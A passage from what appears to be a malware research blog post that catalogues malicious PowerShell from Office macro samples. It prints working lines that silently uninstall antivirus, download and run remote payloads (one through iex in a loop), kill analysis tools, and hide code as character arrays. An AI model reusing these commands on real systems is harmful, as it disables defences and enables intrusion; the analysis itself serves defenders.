<p><img class="alignnone size-full wp-image-25158" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig7.png" alt="fig7" width="899" height="264" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig7.png 899w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig7-300x88.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig7-768x226.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig7-370x109.png 370w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p><em>Figure 7 Excel Macro decodes embedded Powershell script and PE file.</em></p>
<p><strong>Remove AV (2 Samples – 0.05% Coverage)</strong></p>
<p>This next variant uses PowerShell to forcefully uninstall both x86 and x64 versions of an installed AV application. It iterates over entries in the Uninstall registry path to find items with “*AVG*” and then quietly uninstalls each instance.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9a4112418453" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$uninstall32s = gci "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;$uninstall64s = gci "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;foreach($uninstall64 in $uninstall64s) {$uninstall64 = $uninstall64.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";$uninstall64 = $uninstall64.Trim();if($uninstall64 -like "*/mode=offline*"){}else{Write-Warning $uninstall64; start-process "msiexec.exe" -args "/x $uninstall64  /qn /norestart" -Wait }};foreach($uninstall32 in $uninstall32s) {$uninstall32 = $uninstall32.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";$uninstall32 = $uninstall32.Trim();if($uninstall32 -like "*/mode=offline*"){}else{Write-Warning $uninstall32; start-process "msiexec.exe" -args "/x $uninstall32  /qn /norestart" -Wait }};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9a4112418453-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9a4112418453-1"><span class="crayon-sy">$</span><span class="crayon-v">uninstall32s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">gci</span><span class="crayon-h"> </span><span class="crayon-s">"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-i">gp</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-i">PSPath</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">like</span><span class="crayon-h"> </span><span class="crayon-s">"*AVG*"</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">select </span><span class="crayon-v">UninstallString</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">gci</span><span class="crayon-h"> </span><span class="crayon-s">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-i">gp</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-i">PSPath</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">like</span><span class="crayon-h"> </span><span class="crayon-s">"*AVG*"</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">select </span><span class="crayon-v">UninstallString</span><span class="crayon-sy">;</span><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">uninstall64 </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64s</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-sy">.</span><span class="crayon-v">UninstallString</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"MsiExec.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"/I"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"/X"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-sy">.</span><span class="crayon-e">Trim</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">like</span><span class="crayon-h"> </span><span class="crayon-s">"*/mode=offline*"</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-st">else</span><span class="crayon-sy">{</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Warning</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">start</span><span class="crayon-o">-</span><span class="crayon-i">process</span><span class="crayon-h"> </span><span class="crayon-s">"msiexec.exe"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">args</span><span class="crayon-h"> </span><span class="crayon-s">"/x $uninstall64&nbsp;&nbsp;/qn /norestart"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Wait</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">uninstall32 </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32s</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-sy">.</span><span class="crayon-v">UninstallString</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"MsiExec.exe"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"/I"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Replace</span><span class="crayon-h"> </span><span class="crayon-s">"/X"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-sy">.</span><span class="crayon-e">Trim</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">like</span><span class="crayon-h"> </span><span class="crayon-s">"*/mode=offline*"</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-st">else</span><span class="crayon-sy">{</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Warning</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">uninstall32</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">start</span><span class="crayon-o">-</span><span class="crayon-i">process</span><span class="crayon-h"> </span><span class="crayon-s">"msiexec.exe"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">args</span><span class="crayon-h"> </span><span class="crayon-s">"/x $uninstall32&nbsp;&nbsp;/qn /norestart"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Wait</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p><strong>Notable One-Offs</strong></p>
<p>After identifying as many variants as possible, I was left with around 100 “Unknown” samples, which were usually custom spins on the techniques described above. I’ll end this cataloging with a quick overview of some of the more notable samples.</p>
<p><strong>Hidden Messages</strong></p>
<p>This sample does some basic date checking through PowerShell and compares current datetime to an included datetime, if the current datetime is past the included one, it will not run. At the end of the code though, they leave a commented call-out to, possibly, their “hacking” group.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9a8357827153" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu[.]com/update',"$env:temp\update");Start-Process pythonw.exe "$env:temp\update 31337"};#NIXU17{pow3r_t0_the_sh3lls}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9a8357827153-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9a8357827153-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Date</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">Ticks</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">lt</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Date</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Date</span><span class="crayon-h"> </span><span class="crayon-s">'18-jan-2017 00:00:00'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">Ticks</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://drobbox-api.dynu[.]com/update'</span><span class="crayon-sy">,</span><span class="crayon-s">"$env:temp\update"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-e">Process </span><span class="crayon-v">pythonw</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-s">"$env:temp\update 31337"</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-p">#NIXU17{pow3r_t0_the_sh3lls}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>Another example of leaving hidden messages is in the sample below.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9a9621975141" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
while($true){Start-Sleep -s 120; $m=New-Object System.Net.WebClient;$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add('user-agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)'); iex(($m.downloadstring('https://raw.githubusercontent.com/rollzedice/js/master/drupal.js')));}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9a9621975141-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9a9621975141-1"><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-v">Sleep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-cn">120</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">m</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">pr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebRequest</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">GetSystemWebProxy</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">pr</span><span class="crayon-sy">.</span><span class="crayon-v">Credentials</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">CredentialCache</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DefaultCredentials</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-v">proxy</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">pr</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-v">UseDefaultCredentials</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-v">Headers</span><span class="crayon-sy">.</span><span class="crayon-e">Add</span><span class="crayon-sy">(</span><span class="crayon-s">'user-agent'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">iex</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-e">downloadstring</span><span class="crayon-sy">(</span><span class="crayon-s">'https://raw.githubusercontent.com/rollzedice/js/master/drupal.js'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>When you analyze the code it pulls down remotely from GitHub, which at the time of this writing kills PowerShell processes, it says “Hello SOC/IR team!  :-)”. It’s possible this is just a pentest or red-team exercise given the history of the file using “Test” a lot.</p>
<p><img class="alignnone size-full wp-image-25164" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig8.png" alt="fig8" width="899" height="450" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig8.png 899w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig8-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig8-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig8-370x185.png 370w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p><em>Figure 8 JavaScript file kills powershell and greets SOC/IR team.</em></p>
<p><strong>Process Killing</strong></p>
<p>This is another example of using PowerShell for specific purposes in an overarching attack. It will kill a number of processes typically associated with malware analysis.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9aa359271009" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
kill -processname Taskmgr, ProcessHacker*, Procmon*, Procexp*, Procdump* -force</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9aa359271009-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9aa359271009-1"><span class="crayon-v">kill</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">processname </span><span class="crayon-v">Taskmgr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e ">ProcessHacker*</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e ">Procmon*</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e ">Procexp*</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e ">Procdump*</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">force</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>Layers of Obfuscation</strong></p>
<p>For this last example, it appears to be related to the samples shown in the “PowerSploit GTS” variants, as the originating macros are almost identical, but this sample did not use any of the other pieces.</p>
<p>This particular sample uses multiple layers of obfuscation to carry out its attack.</p>
<p>Layer 1 –</p>
<p>A Microsoft Excel document has a macro that pulls a base64 encoded data from a cell that is passes to PowerShell’s EncodedCommand parameter when it launches.</p>
<p><img class="alignnone size-full wp-image-25167" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/layer1.png" alt="layer1" width="900" height="133" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/layer1.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/layer1-300x44.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/layer1-768x113.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/layer1-370x55.png 370w" sizes="(max-width: 900px) 100vw, 900px" /></p>
<p>Layer 2 –</p>
<p>The decoded base64 is a long array of int values that get converted to their char value, and then executed as another PowerShell script.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9ad048240797" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
-JOIn (( 32 ,32 , 36 ,86 ,115 , 110 , 50,108 , 54, 32 ,61 , 32,32 , 91,116,121,112,101, 93 ,40 ,34,123 ,51 , 125 , 123, 48 ,125, 123, 49, 125, ,53, 45 ,49, 54,55 , 45,39, 44 ,39 ,101 , 46 , 97, 109, 97 , 122 ,111,110 ,97, 39, 44, 39 ,53,39, 44,39, 119 , 115, 46, 99 , 111 , 109 ,58, 56 , 48 , 39 ,44 ,39,45 , 119, 101 ,115 , 39,41, 41 , 59)|%{([inT]$_-AS [chAr]) } ) | iex</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9ad048240797-1">1</div></div>
				</td>
